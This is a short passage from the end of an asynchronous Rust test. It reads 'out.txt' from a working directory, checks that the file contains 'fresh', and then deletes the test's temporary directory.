    let content = tokio::fs::read_to_string(workdir.join("out.txt"))
        .await
        .unwrap();
    assert_eq!(content.trim(), "fresh");

    let _ = tokio::fs::remove_dir_all(&workdir).await;
}
